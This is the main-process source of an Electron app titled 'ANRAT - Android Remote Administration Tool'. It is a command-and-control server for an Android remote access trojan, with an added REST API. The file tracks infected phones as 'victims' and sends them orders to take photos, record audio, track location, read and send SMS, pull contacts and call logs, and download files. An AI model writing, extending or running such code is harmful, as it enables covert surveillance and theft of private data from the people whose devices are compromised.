const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;

const path = require('path');
const os = require('os');

//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
let apiServer = null;
//--------------------------------------------------------------

// ========== TAMBAHKAN EXPRESS API SERVER ==========
function createAPIServer(port = 3000) {
  const apiApp = express();
  
  // Middleware
  apiApp.use(cors());
  apiApp.use(bodyParser.json());
  apiApp.use(bodyParser.urlencoded({ extended: true }));

  // ===== API ENDPOINTS =====
  
  // Get all victims
  apiApp.get('/api/victims', (req, res) => {
    try {
      const victims = victimsList.getVictimList();
      const victimsArray = Object.keys(victims).map(key => ({
        id: key,
        ip: victims[key].ip,
        port: victims[key].port,
        country: victims[key].country,
        manufacturer: victims[key].manf,
        model: victims[key].model,
        release: victims[key].release
      }));
      res.json({ success: true, victims: victimsArray });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Get specific victim
  apiApp.get('/api/victims/:id', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }
      res.json({ 
        success: true, 
        victim: {
          id: req.params.id,
          ip: victim.ip,
          port: victim.port,
          country: victim.country,
          manufacturer: victim.manf,
          model: victim.model,
          release: victim.release
        }
      });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Send command to victim
  apiApp.post('/api/victims/:id/command', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { order, extra, data } = req.body;
      
      if (!order) {
        return res.status(400).json({ success: false, error: 'Order is required' });
      }

      // Send command to victim
      victim.socket.emit('order', { order, extra, ...data });
      
      res.json({ success: true, message: 'Command sent successfully' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Take camera photo
  apiApp.post('/api/victims/:id/camera', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { cameraId = 0 } = req.body;
      
      // Request camera list first
      victim.socket.emit('order', { order: 'x0000ca', extra: 'camList' });
      
      // Wait for response and take photo
      setTimeout(() => {
        victim.socket.emit('order', { order: 'x0000ca', extra: cameraId });
      }, 1000);

      res.json({ success: true, message: 'Camera capture initiated' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Get SMS list
  apiApp.post('/api/victims/:id/sms/list', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000sm', extra: 'ls' });
      res.json({ success: true, message: 'SMS list request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Send SMS
  apiApp.post('/api/victims/:id/sms/send', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { to, message } = req.body;
      
      if (!to || !message) {
        return res.status(400).json({ success: false, error: 'Phone number and message are required' });
      }

      victim.socket.emit('order', { 
        order: 'x0000sm', 
        extra: 'sendSMS', 
        to: to, 
        sms: message 
      });

      res.json({ success: true, message: 'SMS sent successfully' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Get contacts
  apiApp.post('/api/victims/:id/contacts', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000cn' });
      res.json({ success: true, message: 'Contacts request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Get call logs
  apiApp.post('/api/victims/:id/calls', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000cl' });
      res.json({ success: true, message: 'Call logs request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Get location
  apiApp.post('/api/victims/:id/location', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      victim.socket.emit('order', { order: 'x0000lm' });
      res.json({ success: true, message: 'Location request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Record audio
  apiApp.post('/api/victims/:id/microphone', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { duration = 10 } = req.body;
      
      victim.socket.emit('order', { order: 'x0000mc', sec: duration });
      res.json({ success: true, message: 'Microphone recording initiated' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // List files
  apiApp.post('/api/victims/:id/files/list', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { path = '/storage/emulated/0/' } = req.body;
      
      victim.socket.emit('order', { 
        order: 'x0000fm', 
        extra: 'ls', 
        path: path 
      });
      
      res.json({ success: true, message: 'File list request sent' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Download file
  apiApp.post('/api/victims/:id/files/download', (req, res) => {
    try {
      const victim = victimsList.getVictim(req.params.id);
      if (victim === -1) {
        return res.status(404).json({ success: false, error: 'Victim not found' });
      }

      const { path } = req.body;
      
      if (!path) {
        return res.status(400).json({ success: false, error: 'File path is required' });
      }

      victim.socket.emit('order', { 
        order: 'x0000fm', 
        extra: 'dl', 
        path: path 
      });
      
      res.json({ success: true, message: 'File download initiated' });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Start listening on RAT port
  apiApp.post('/api/server/listen', (req, res) => {
    try {
      const { port = 42474 } = req.body;
      
      if (listeningStatus[port]) {
        return res.json({ success: false, error: 'Already listening on port ' + port });
      }

      IOs[port] = io.listen(port, {
        maxHttpBufferSize: 1024 * 1024 * 100,
        cors: {
          origin: "*",
          methods: ["GET", "POST"]
        }
      });
      
      IOs[port].sockets.pingInterval = 10000;
      IOs[port].sockets.pingTimeout = 10000;

      IOs[port].sockets.on('connection', function (socket) {
        var address = socket.request.connection;
        var query = socket.handshake.query;
        var index = query.id;
        var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
        var country = null;
        var geo = geoip.lookup(ip);
        if (geo) country = geo.country.toLowerCase();

        victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

        if (win) {
          win.webContents.send('SocketIO:NewVictim', index);
        }

        socket.on('disconnect', function () {
          victimsList.rmVictim(index);
          if (win) {
            win.webContents.send('SocketIO:RemoveVictim', index);
          }
        });
      });

      listeningStatus[port] = true;
      res.json({ success: true, message: 'Started listening on port ' + port });
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Stop listening
  apiApp.post('/api/server/stop', (req, res) => {
    try {
      const { port = 42474 } = req.body;
      
      if (IOs[port]) {
        IOs[port].close();
        IOs[port] = null;
        listeningStatus[port] = false;
        res.json({ success: true, message: 'Stopped listening on port ' + port });
      } else {
        res.json({ success: false, error: 'Not listening on port ' + port });
      }
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // Health check
  apiApp.get('/api/health', (req, res) => {
    res.json({ success: true, status: 'running', version: '1.0.0' });
  });

  // Start server
  apiServer = apiApp.listen(port, () => {
    console.log(`✓ API Server running on http://localhost:${port}`);
    console.log(`✓ API Documentation: http://localhost:${port}/api/health`);
  });

  return apiServer;
}

// Detect OS
const isLinux = process.platform === 'linux';
const isWindows = process.platform === 'win32';
const isMac = process.platform === 'darwin';
const listeningStatus = {};

function createWindow() {
  display = electron.screen.getPrimaryDisplay();

  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: !isLinux,
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    type: "splash",
    alwaysOnTop: true,
    show: false,
    center: true,
    resizable: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && { backgroundThrottling: false })
    }
  });

  splashWin.loadFile(path.join(__dirname, 'app/splash.html'));

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show();
  });

  splashWin.on('closed', () => {
    splashWin = null
  })

  win = new BrowserWindow({
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    width: 1200,
    height: 800,
    minWidth: 900,
    minHeight: 600,
    show: false,
    resizable: true,
    center: true,
    frame: isLinux,
    transparent: !isLinux,
    backgroundColor: isLinux ? '#0c094f' : undefined,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && { backgroundThrottling: false })
    }
  });

  if (isLinux) {
    win.setTitle('ANRAT - Android Remote Administration Tool');
  }

  win.loadFile(path.join(__dirname, 'app/index.html'));

  win.on('closed', () => {
    win = null
  })

  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      if (splashWin) {
        splashWin.close();
      }
      win.show();
    }, 2000);
  });
}

app.on('ready', () => {
  createWindow();
  
  // Start API server on port 3000
  createAPIServer(3000);
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    if (apiServer) {
      apiServer.close();
    }
    app.quit()
  }
})

app.on('activate', () => {
  if (win === null) {
    createWindow()
  }
})

process.on('uncaughtException', function (error) {
  console.error('Uncaught Exception:', error);
  if (error.code == "EADDRINUSE") {
    if (win) {
      win.webContents.send('SocketIO:ListenError', "Address Already in Use");
    }
  }
});

// Keep existing IPC handlers
ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  try {
    IOs[port] = io.listen(port, {
      maxHttpBufferSize: 1024 * 1024 * 100,
      cors: { origin: "*", methods: ["GET", "POST"] }
    });
    
    IOs[port].sockets.pingInterval = 10000;
    IOs[port].sockets.pingTimeout = 10000;

    IOs[port].sockets.on('connection', function (socket) {
      var address = socket.request.connection;
      var query = socket.handshake.query;
      var index = query.id;
      var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
      var country = null;
      var geo = geoip.lookup(ip);
      if (geo) country = geo.country.toLowerCase();

      victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

      let notification = new BrowserWindow({
        frame: false,
        x: display.bounds.width - 280,
        y: display.bounds.height - 78,
        show: false,
        width: 280,
        height: 78,
        resizable: false,
        skipTaskbar: true,
        alwaysOnTop: true,
        webPreferences: {
          nodeIntegration: true,
          enableRemoteModule: true,
          contextIsolation: false
        }
      });

      notification.webContents.on('did-finish-load', function () {
        notification.show();
        setTimeout(function () { notification.destroy() }, 3000);
      });

      notification.webContents.victim = victimsList.getVictim(index);
      notification.loadFile(path.join(__dirname, 'app/notification.html'));

      win.webContents.send('SocketIO:NewVictim', index);

      socket.on('disconnect', function () {
        victimsList.rmVictim(index);
        win.webContents.send('SocketIO:RemoveVictim', index);
        if (windows[index]) {
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
          delete windows[index]
        }
      });
    });

    event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
    listeningStatus[port] = true;
    
  } catch (error) {
    console.error('Listen Error:', error);
    event.reply('SocketIO:ListenError', '[x] Error: ' + error.message);
  }
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    IOs[port].close();
    IOs[port] = null;
    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
    listeningStatus[port] = false;
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

ipcMain.on('openLabWindow', function (e, page, index) {
  let child = new BrowserWindow({
    icon: path.join(__dirname, 'app/assets/img/icon.png'),
    parent: win,
    width: 900,
    height: 800,
    minWidth: 800,
    minHeight: 600,
    show: false,
    frame: isLinux,
    transparent: !isLinux,
    backgroundColor: isLinux ? '#0c094f' : undefined,
    resizable: true,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      ...(isLinux && { backgroundThrottling: false })
    }
  })

  if (isLinux) {
    const victim = victimsList.getVictim(index);
    if (victim) {
      child.setTitle(`ANRAT Lab - ${victim.model}`);
    }
  }

  windows[index] = child.id;
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(path.join(__dirname, 'app', page));

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    if (victimsList.getVictim(index) && victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca");
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl");
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn");
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc");
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm");
    }
  })
});